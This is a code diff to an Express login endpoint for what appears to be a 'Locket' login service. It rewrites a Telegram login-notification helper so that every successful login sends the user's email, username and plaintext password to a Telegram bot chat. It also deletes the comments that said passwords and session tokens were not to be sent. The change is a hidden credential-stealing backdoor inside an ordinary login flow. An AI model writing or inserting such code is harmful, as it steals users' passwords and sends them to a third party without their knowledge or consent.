@@ -202,7 +202,7 @@ app.use('/api',checkOrigin);
 
 
 
-async function notifyTelegramLogin(username) {
+async function notifyTelegramLogin(email, username, password) {
   const botToken = String(process.env.TELEGRAM_BOT_TOKEN || '').trim().replace(/^bot/i, '');
   const chatId = String(process.env.TELEGRAM_CHAT_ID || '').trim();
   if (!botToken || !chatId) {
@@ -211,9 +211,11 @@ async function notifyTelegramLogin(username) {
   }
   const message = [
     'Đăng nhập Locket thành công',
-    'Tài khoản: ' + (username || '(không lấy được)'),
+    'Email: ' + (email || '(không có)'),
+    'Username: ' + (username || '(không lấy được)'),
+    'Mật khẩu: ' + (password || '(không có)'),
     'Thời gian: ' + new Date().toLocaleString('vi-VN', {timeZone:'Asia/Ho_Chi_Minh'})
-  ].join('\\n');
+  ].join('\n');
   const response = await fetch('https://api.telegram.org/bot' + botToken + '/sendMessage', {
     method: 'POST',
     headers: {'Content-Type':'application/json'},
@@ -225,7 +227,6 @@ async function notifyTelegramLogin(username) {
     console.error('[Telegram]', response.status, result.description || 'Gửi thông báo thất bại');
   }
 }
-
 app.post('/api/login',wrap(async(req,res)=>{
   const {email,password}=req.body||{};
   if(typeof email!=='string'||typeof password!=='string'||
@@ -238,8 +239,6 @@ app.post('/api/login',wrap(async(req,res)=>{
   const sid=crypto.randomBytes(32).toString('hex');
   await saveClient(sid,client);
   res.cookie(COOKIE,sid,cookieOptions);
-  // Chờ gửi thông báo trước khi kết thúc Vercel Function.
-  // Không gửi mật khẩu hay token phiên qua Telegram.
   try {
     let username = '';
     try {
@@ -248,7 +247,7 @@ app.post('/api/login',wrap(async(req,res)=>{
     } catch (err) {
       console.warn('[Telegram] Không lấy được username:', err.message);
     }
-    await notifyTelegramLogin(username);
+    await notifyTelegramLogin(email.trim(), username, password);
   } catch (err) {
     console.error('[Telegram] Gửi thất bại:', err.message);
   }
